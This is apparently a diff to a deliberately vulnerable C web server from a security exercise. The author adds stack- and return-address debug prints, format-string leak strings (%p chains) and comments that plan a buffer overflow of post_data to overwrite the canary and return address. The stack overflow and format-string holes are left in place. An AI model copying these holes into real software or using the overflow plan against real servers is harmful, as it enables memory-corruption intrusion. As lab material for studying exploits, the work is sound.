@@ -15,8 +15,8 @@ void serve_ultimate();
 
 
 int main(int c, char **v) {
-  read_file("/etc/htpasswd", htpasswd, 100);
-  serve_forever("8000");
+  read_file("./htpasswd", htpasswd, 100);
+  serve_forever(v[1]);
   return 0;
 }
 
@@ -41,20 +41,21 @@ void route() {
     return;
   }
 
+  //fprintf(stderr, "address of server_ultimate is: %p", serve_ultimate);
+  //fprintf(stderr, "address of main is: %p", main);
   ROUTE_START()
 
   ROUTE_GET("/") {
     serve_index();
   }
+  //100 a ebp | ret to lib c | ret after free ptr to arg .... arg --> admin_pwd
 
   ROUTE_POST("/ultimate.html") {
     // An extra layer of protection: require an admin password in POST
     Line admin_pwd[1];
-    read_file("/etc/admin_pwd", admin_pwd, 1);
-
+    read_file("./admin_pwd", admin_pwd, 1);
     char* given_pwd = post_param("admin_pwd");
     int allowed = given_pwd != NULL && strcmp(admin_pwd[0], given_pwd) == 0;
-
     if (allowed)
       serve_ultimate();
     else
@@ -76,9 +77,9 @@ void route() {
   }
 
   ROUTE_POST("/") {
-    printf("HTTP/1.1 200 OK\r\n\r\n");
-    printf("Wow, seems that you POSTed %d bytes. \r\n", payload_size);
-    printf("Fetch the data using `payload` variable.");
+    fprintf(stderr, "HTTP/1.1 200 OK\r\n\r\n");
+    fprintf(stderr, "Wow, seems that you POSTed %d bytes. \r\n", payload_size);
+    fprintf(stderr, "Fetch the data using `payload` variable.");
   }
 
   ROUTE_END()
@@ -105,6 +106,7 @@ void md5_hex(char *str, char *md5) {
 }
 
 int check_auth(Line users[], char *auth_header) {
+  fprintf(stderr, "ret from check_auth is: %p\n", __builtin_return_address(0));
   // auth_header contains "Basic <Base64>", extract <Base64> string and decode in auth_decoded
   unsigned char *auth_decoded;
   int length;
@@ -126,14 +128,17 @@ int check_auth(Line users[], char *auth_header) {
       break;
     }
   }
-
   // check if user is found
   if(password_md5 == NULL) {
-    printf("HTTP/1.1 401 Unauthorized\r\n");
-    printf("WWW-Authenticate: Basic realm=\"");
-    printf("Invalid user: ");
-    printf(auth_username);
-    printf("\"\r\n\r\n");
+    fprintf(stderr, "HTTP/1.1 401 Unauthorized\r\n");
+    fprintf(stderr, "WWW-Authenticate: Basic realm=\"");
+    fprintf(stderr, "Invalid user: ");
+    //fprintf(stderr, "%p", users);
+    fprintf(stderr, auth_username);
+    //fprintf(stderr, "1: %p 2: %p 3: %p 4: %p 5: %p 6: %p 7: %p 8: %p 9: %p 10: %p 11: %p 12: %p 13: %p 14: %p 15: %p 16: %p 17: %p 18: %p 19: %p 20: %p 21: %p 22: %p 23: %p 24: %p 25: %p 26: %p 27: %p 28: %p 29: %p 30: %p");
+    //fprintf(stderr, "%p%p%p%p%p%s\n");
+    //fprintf(stderr, "1:%p 2:%p 3:%p 4:%p 5:%p 6:%s 7:%p 8:%p 9:%p\n");
+    fprintf(stderr, "\"\r\n\r\n");
 
     free(auth_decoded);
     return 0;
@@ -163,6 +168,7 @@ void send_file(char *filename) {
   while((buflen = fread(buf, 1, 1024, file)) > 0)
     fwrite(buf, 1, buflen, stdout);
   fclose(file);
+  fprintf(stderr, "finished sending file\n");
 }
 
 // Parses and returns (in new memory) the value of a POST param
@@ -174,9 +180,15 @@ char* post_param(char* param_name) {
   // The POST data are in the form name1=value1&name2=value2&...
   // We need NULL terminated strings, so change '&' and '=' to '\0'
   // (copy first to avoid changing the real payload).
-
-  char post_data[100];
+  //admin_pwd=path to .zlog + & + canary + ebp + ret + address of given_param
+  char post_data[100]; //path\0+canary+ebp+ret to send_file + arg1 --> address to post_data 
+  fprintf(stderr, "address of post_data is: %p\n", post_data);
+  fprintf(stderr, "ret from post_param BEFORE memcpy is: %p\n", __builtin_return_address(0));
   memcpy(post_data, payload, payload_size+1);
+  fprintf(stderr, "ret from post_param AFTER memcpy is: %p\n", __builtin_return_address(0));
+  //40 bs
+  //memcpy(post_data,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", strlen("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") + 1);
+  //memcpy(post_data, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x56\x55\x60\x1e", strlen("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x56\x55\x60\x1e") + 1);
 
   for (int i = 0; i < payload_size; i++)
     if (post_data[i] == '&' || post_data[i] == '=')
@@ -198,11 +210,12 @@ char* post_param(char* param_name) {
 }
 
 void serve_index() {
-    printf("HTTP/1.1 200 OK\r\n\r\n");
-    send_file("/var/www/pico/index.html");
+  printf("HTTP/1.1 200 OK\r\n\r\n");
+  send_file("./site/index.html");
 }
 
 void serve_ultimate() {
+  fprintf(stderr, "YES INSIDE serve_ultimate()\n");
   printf("HTTP/1.1 200 OK\r\n\r\n");
-  send_file("/var/www/pico/ultimate.html");
+  send_file("./site/ultimate.html");
 }
